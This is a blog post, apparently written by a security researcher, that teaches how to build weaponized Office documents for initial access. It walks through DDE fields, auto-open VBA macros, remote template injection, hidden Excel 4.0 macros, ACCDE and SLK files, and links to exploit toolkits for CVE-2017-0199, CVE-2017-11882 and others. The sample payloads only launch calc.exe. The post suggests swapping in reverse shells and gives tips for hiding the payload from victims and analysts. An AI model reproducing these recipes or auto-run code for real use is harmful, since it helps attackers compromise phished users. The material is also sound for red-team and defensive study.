---
title: "Weaponization of Malicious document as Initial Access"
date: "2020-11-10"
layout: single
tags:
- Malware
categories:
- Blog-post
---

Generously, attacker will use these below techniques in leveraging Microrosft Office feature and vulnerabilities:
1. Exploits
2. Macros
3. Remote template injection
and many more...

In this post, we will learn various of techniques how to make a maldocs that can execute code (in our case, we will just run the `calc.exe`). 

Why security researcher always pop-up a `calc.exe` when doing a Proof-of-Concept? Because it is simple and easy to pop up a calculator hahaha. 

You can always replace the `calc.exe` execution with any payload you want like *Powershell reverse shell* or *mshta fileless* or anything else that suitable your appetite but popping up a `calc.exe` indicated that this things that we play around right now, can also execute anything like download and execute malware. Not just a `calc.exe` execution.

Claim: This is for education only as to understand how maldocs were created by the attacker out there. Do with your own risk.

Table of content:
1. [DDE Attack](https://fareedfauzi.github.io/blog-post/Maldoc-as-Initial-Access/#dde-attack)
2. [VBA Macro](https://fareedfauzi.github.io/blog-post/Maldoc-as-Initial-Access/#vba-macro)
3. [Remote Tempalate Injection](https://fareedfauzi.github.io/blog-post/Maldoc-as-Initial-Access/#template-injection) 
4. [Excel 4.0 Macro](https://fareedfauzi.github.io/blog-post/Maldoc-as-Initial-Access/#excel4macro)
5. [ACCDE executable](https://fareedfauzi.github.io/blog-post/Maldoc-as-Initial-Access/#accde-executable)
6. [.SLK Excel](https://fareedfauzi.github.io/blog-post/Maldoc-as-Initial-Access/#slk-excel)
7. [CVE-2017-0199](https://fareedfauzi.github.io/blog-post/Maldoc-as-Initial-Access/#cve-2017-0199)
8. [CVE-2012-0158](https://fareedfauzi.github.io/blog-post/Maldoc-as-Initial-Access/#cve-2012-0158)
9. [CVE-2017-8759](https://fareedfauzi.github.io/blog-post/Maldoc-as-Initial-Access/#cve-2017-8759)
10. [CVE 2017-11882](https://fareedfauzi.github.io/blog-post/Maldoc-as-Initial-Access/#cve-2017-11882)
11. [Others cool techniques](https://fareedfauzi.github.io/blog-post/Maldoc-as-Initial-Access/#others-cool-techniques)


accde-executable
# DDE attack

Let's start with the DDE attack. This attack was commonly use by attacker out there, where once a victim was phished by clicking the "yes" button in the Warning message by Office, they can immidiately being compromised by the attacker.

DDEAUTO, short for automatic dynamic data exchange, is a command you can put right inside the data of an Office file to get it to pull data out of another file. In our context DDE works by executing command, that will provide the data (data provider).


## Microsoft Word

Go to `Insert` tab -> Click on `Quick Parts` -> Click on `Field`

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-02-21-22-21.png)

Let we setup the DDEAUTO payload at footer of our document as victim supposely will not notice it hehe.

Choose `= (Formula)` field names and click `OK` button,

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-02-21-23-26.png)

After that, you should see a Field inserted in the document with an error `!Unexpected End of Formula`. Right-click the Field, and choose `Toggle Field Codes`.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-02-21-28-58.png)

The field code now should display `{= \* MERGEFORMAT}`.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-02-21-29-25.png)

Change the field code by manually typing the payload command you want to execute. In our case, we only gonna execute our calculator app.

```
{DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"  }
```

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-02-21-36-29.png)

Save the document.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-02-21-37-33.png)

Let's execute the document. As victim, they will be welcome with these two warning message. By clicking `Yes` on both warning box, our command will be execute!

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-02-21-38-41.png)

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-02-21-39-53.png)

Calc.exe pop-up!

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-02-21-40-14.png)

## Microsoft Excel

In Excel, we can embedded our DDE payload through the use of formulas feature.

Choose a box to put this payload `=cmd|'/c calc.exe'!'T81'` where T81 should be any table column number. Paste in the box and Excel will pop-up a warning. Just ignore it by click `No` for now. 

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-02-22-04-25.png)

Then, it will display this `#REF!` text in the box.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-02-22-05-06.png)

Click on the Yellow Warning icon, and choose `Ignore Error`

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-02-22-08-31.png)

then save the document.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-02-22-09-53.png)

Open the document and click `Enable Content`.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-02-22-10-38.png)

Click `yes`, and calc.exe will be pop-up!

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-02-22-11-26.png)

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-02-22-11-40.png)


# VBA Macro

In malware wild, macro malware is typically transmitted through phishing emails that contain malicious attachments. When the macros run, malware coded into the VBA will begin to infect all files that are opened using Microsoft Office. In our case, we will only execute a `calc.exe` app.

Click on 'view" tab

![//pic2](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic2.png)

Click Macros

![//pic3](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic3.PNG)

Type any name you want for Macro name and click "create" to create the macro

![//pic4](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic4.PNG)

On "Project" path, click ThisDocument

![//pic5](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic5.PNG)


Write our malicious macro code like below

```
Private Sub Document_Open()
Test
End Sub

Private Sub DocumentOpen()
Test
End Sub

Private Sub Auto_Open()
Test
End Sub

Private Sub AutoOpen()
Test
End Sub

Private Sub Auto_Exec()
Test
End Sub

Private Sub Test()
    Shell ("cmd /c calc.exe")
End Sub
```

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-02-22-59-48.png)

Save the document as `.doc` or `.docm` and run it!

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-02-23-02-18.png)

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-02-23-02-39.png)

You can also use other payload command line like powershell etc.

# Template injection

This part will shows us how to create a non-macro document that uses a template that contains vba macros, which is loaded from a remote server when the document is executed.

When the maldoc is opened, it will attempt to retrieve and execute template document define at `word/_rels/settings.xml.rels`.

Let's first create a malicious template document. Then, we will create the second document which we will modify the `word/_rels/settings.xml` of the document which will be lead the document to retrieve and replace with our malicious template document.

Assume that we gonna use the document that we've have created in VBA Macro part above.

I've added a line to pop-up a msgbox that tell us that our remote template injection is successful.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-22-07-08.png)

Save the file as Macro-Enabled Template `.dotm` format.

Now, let's create a normal document using a free template from Microsoft Office. In my case, I'll using a free template named "Blue grey resume".

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-22-11-54.png)

Then, save the document normally. Now we have the both documents.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-22-13-40.png)

Unzip the docx using decompress tool. In my case, I'll using 7zip.

From here, we can start to see the files containing in the docx file.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-22-17-21.png)

Navigate to `word/_rels/` folder, and we can start modifying the content of `setting.xml.rels`.

Replace the content of the attribute `Target` in the file `setting.xml.rels` with your remote document serve in your server.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-22-19-51.png)

Here my Kali box will serving the malicious template that we've created.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-22-41-31.png)

Replace the original link with our document link and save the file.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-22-42-40.png)

Now, compressed back all the files to a zip. Then change the `.zip` format to `.docx`.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-22-28-01.png)

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-22-29-13.png)

Now this document has contain the malicious remote template injection. Let's open the document.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-22-31-32.png)

Yeah, our remote template injection is running successfully.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-22-43-55.png)



# Excel4Macro

Let's dive into Excel 4.0 macros which also called XLM macros. Excel 4.0 macro can be difficult to analyse and detected by AV.

Let's start create some XLM macro and execute our calc.exe!

First step, create a new Excel workbook. Right click `Sheet1` at the bottom of the Excel and choose `Insert`.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-16-29-34.png)

A windows box will pop-up that allow us to choose which object we want to insert. Select `MS Excel 4.0 Macro` and click `OK`.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-16-31-03.png)

From here, let's start to write our own macro.

Click on any cell and type the formulas shown in below picture.

```
=EXEC("calc.exe")
=ALERT("Excel 4.0 Macro executed")
=RETURN()
```

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-16-33-46.png)

On the name box at the top left, fill in `auto_open` to make our Excel 4.0 macro execute automatically when the workbook document is opened. It is similar to `Sub AutoOpen()` for VBA macros.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-16-36-07.png)

To test our macro, select all the macro and right click. Choose `Run` then click `Run` box at the left.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-16-39-19.png)

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-16-40-09.png)

Our macro will be execute right after we run the macro.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-16-40-47.png)

Also, we can hide our `macro` sheet by right click on the `Macro1` tab and select hidden.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-16-43-37.png)

Our macro sheet will be gone from the sight.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-16-44-16.png)

Now, let's save it as a file. You can choose either `.xls` and `.xlsm` format.

Once user open the workbook and click `Enable Content`, our XLM macro will be execute successfully.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-16-45-39.png)

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-07-16-45-56.png)

# ACCDE executable

This techniques was rare case and I found that there is no public research yet relate to this technique. I found this methodology were used by an attacker of my client during my analysis and investigation.

Based on LifeWire A file with the ACCDE file extension is a Microsoft Access Execute Only Database file used to protect an ACCDB file. It replaces the MDE format (which secures an MDB file) used by older versions of MS Access.

The VBA code in an ACCDE file is saved in a way that prevents anyone from seeing or changing it. When you save a Microsoft Access database to the ACCDE format, you can also choose to protect custom database code as well as to encrypt the entire file behind a password.

So, long short story, analyst cannot be view the content of the VBA in .ACCDE file.

Let's try create one.

Open Microsoft Access and just use the blank one.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-10-16-30-02.png)

Next, at the tab of Microsoft Office, navigate to `Create` tab and choose module to create our malicious VBA.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-10-16-31-47.png)

In the `module1` opened by Access, here we can craft our vba payload in a function that we are about to create. In our case, pop-up a `calc.exe`.

Here we declare a public function `popcalc()` and the command that we want to execute.

```
Public Function Test()
    Shell ("cmd /c calc.exe")
End Function
```

Then, save the Module with name `Module1` or anything name that you want.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-10-16-37-07.png)

The next part is to create a macro that will execute our `Module1` once the document is open.

Go to `Create` tab and Choose `Macro`.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-10-16-38-49.png)

In the `Add New Action` box, choose `Run Code`
 
![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-10-16-40-58.png)

From here, type our Module1's function with `=` equal sign. You always need to type an equals sign (=) in front of the function name.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-10-16-43-37.png)

Then save it with name `autoexec` to automatically run our VBA when this document opened by victim.

CTRL+S and rename it.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-10-16-45-23.png)

Then, save the Access database file (.accdb) and try to run it.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-10-16-48-21.png)

The calc.exe was successfully run.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-10-16-49-04.png)

Let's hide both of the Macros and Modules by `Right-Click` on the both Object, and choose `Object Properties`. Then, check `hidden` checkbox. Click `Apply`. Now, both of it will be hidden from clear viewers.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-10-16-51-25.png)


But if you want to view it just `Right-click` in the box, choose `Navigation Options`. In the `Display Options` part, check the `Show Hidden Objects` checkbox and click `OK`.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-10-16-54-48.png)

Ok now, let's save it as `.accde` executable.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-10-16-55-36.png)

Let's execute our .accde file.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-10-16-55-57.png)

We was welcomed by Microsoft Access Security Notice warning about the security concern. Just click `Open` and there you go!

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-10-16-58-36.png)

Our command was succesfully executed!

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-10-16-59-19.png)

As you can see, we can't view our `Module` in the `.accde` executable.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-10-17-01-49.png)

# .SLK Excel

This study is based on [The MS Office Magic Show Stan Hegt Pieter Ceelen](https://www.youtube.com/watch?v=xY2DIRfqNvA) on SLK part. Do check out the video, it's awesome.

First, let's create the `.slk` file using text editor and save it as `filename.slk`

```
ID;P
O;E
NN;NAuto_open;ER1C1;KOut Flank;F
C;X1;Y1;K0;EEXEC("calc.exe")
C;X1;Y2;K0;EHALT()
E
```

You can learn what are the meanings of every lines in the above code from the video by Stan I mentioned.

Here I saved it.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-10-22-42-08.png)

Let's open it and see what happen.

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-10-22-43-10.png)

There is macro in there. If we click "Enable Content" button and we get our calc.exe!

![](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maldoc-weaponization/2020-11-10-22-47-26.png)

# CVE-2017-0199

Based on Fireeye, this vulnerability allows a malicious actor to download and execute a Visual Basic script containing PowerShell commands when a user opens a document containing an embedded exploit. 

You can use [https://github.com/bhdresh/CVE-2017-0199](https://github.com/bhdresh/CVE-2017-0199) exploit toolkit for CVE-2017-0199

# CVE-2012-0158

Marta Janus from SecureList said that CVE-2012-0158 is a buffer overflow vulnerability in the ListView / TreeView ActiveX controls in the MSCOMCTL.OCX library. The malicious code can be triggered by a specially crafted DOC or RTF file for MS Office versions 2003, 2007 and 2010. Although this vulnerability was patched by Microsoft more than a year ago, it seems that not everyone cared to install the updates. And those who didn’t may be at risk of getting all their documents, pictures and databases encrypted by a new version of the Gimemo ransomware (detected by our products as Trojan-Ransom.Win32.Gimemo.beic).

There is a Metasploit module for this vulnerability. Refer [https://www.exploit-db.com/exploits/18780](https://www.exploit-db.com/exploits/18780)

# CVE-2017-8759

As describe by Rapid7, this exploit is a remote code execution vulnerability exists when Microsoft .NET Framework processes untrusted input. An attacker who successfully exploited this vulnerability in software using the .NET framework could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights. To exploit the vulnerability, an attacker would first need to convince the user to open a malicious document or application. The security update addresses the vulnerability by correcting how .NET validates untrusted input. 

Refer this sample exploit [https://github.com/Voulnet/CVE-2017-8759-Exploit-sample](https://github.com/Voulnet/CVE-2017-8759-Exploit-sample)


# CVE 2017-11882
This exploit triggers WebClient service to start and execute remote file from attacker-controlled WebDav server. The reason why this approach might be handy is a limitation of executed command length. However with help of WebDav it is possible to launch arbitrary attacker-controlled executable on vulnerable machine. This script creates simple document with several OLE objects. These objects exploits CVE-2017-11882, which results in sequential command execution. 

Refer [https://github.com/embedi/CVE-2017-11882](https://github.com/embedi/CVE-2017-11882)

Alternatively, we can use metasploit. Refer [here](https://www.rapid7.com/db/modules/exploit/windows/fileformat/office_ms17_11882)


# Others cool techniques
1. [The MS Office Magic Show Stan Hegt Pieter Ceelen](https://www.youtube.com/watch?v=xY2DIRfqNvA)
    - VBA Stomping (remove vba code) but execute it with P-code
    - Remote template injection ft HTML Smuggling
    - .SLK Excel
2. [Offensive Maldocs in 2020 | Joe Leon & Matt Grandy](https://www.youtube.com/watch?v=RW5U9yxilf4)
    - XLM Macro
    - PPT Hover Over
    - Inline Shapes
3. [Phishing with MS Office by Red Teaming Experiments](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office)
4. [Office in Wonderland](https://www.youtube.com/watch?v=9ULzZA70Dzg&list=WL&index=3&t=1714s)
    - CVE-2019-0540
    - CVE-2019-0561
    - VBA Stomping
    - Hiding XLM macro with very hidden
    - SLK Excel
    - Excel 4.0 DCOM
